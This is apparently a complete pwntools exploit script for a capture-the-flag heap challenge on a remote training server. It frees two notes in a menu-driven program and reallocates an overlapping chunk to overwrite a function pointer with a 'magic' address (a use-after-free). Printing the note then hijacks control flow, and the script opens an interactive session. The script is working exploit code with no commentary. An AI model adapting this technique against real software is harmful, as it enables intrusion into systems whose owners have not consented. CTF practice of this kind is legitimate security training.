from pwn import *
context(os='linux', arch='i386', log_level='debug')
p = remote('node4.buuoj.cn', 29451)
magic = 0x08048945

def choice(a):
	p.recvuntil('choice :')
	p.sendline(str(a))

def add(size, cont):
	choice(1)
	p.recvuntil('size :')
	p.sendline(str(size))
	p.sendline(cont)

def dele(idx):
	choice(2)
	p.recvuntil('dex :')
	p.sendline(str(idx))

def prt(idx):
	choice(3)
	p.recvuntil('dex :')
	p.sendline(str(idx))

add(16, '123')
add(16, '123')
dele(0)
dele(1)
add(8, p32(magic))
prt(0)

p.interactive()
